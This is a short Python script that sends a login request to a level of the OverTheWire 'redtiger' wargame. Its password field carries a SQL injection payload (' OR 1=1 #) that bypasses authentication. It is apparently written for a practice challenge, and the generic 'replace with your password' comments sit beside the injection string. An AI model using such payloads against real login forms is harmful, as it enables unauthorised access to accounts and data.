import requests

# Define the URL of the login endpoint
login_url = "https://redtiger.labs.overthewire.org/level1.php/login"  # Replace with the actual login URL

# Create a dictionary containing the email and password
credentials = {
    'email': 'Hornoxe',     # Replace with your email
    'password': "' OR 1=1 #"            # Replace with your password
}

# Send a POST request with the credentials
response = requests.post(login_url, data=credentials)

# Check the response status code to see if the login was successful
if response.status_code == 200:
    print("Login successful!")
    # You can perform further actions on the authenticated session here.
else:
    print("Login failed. Status code:", response.status_code)
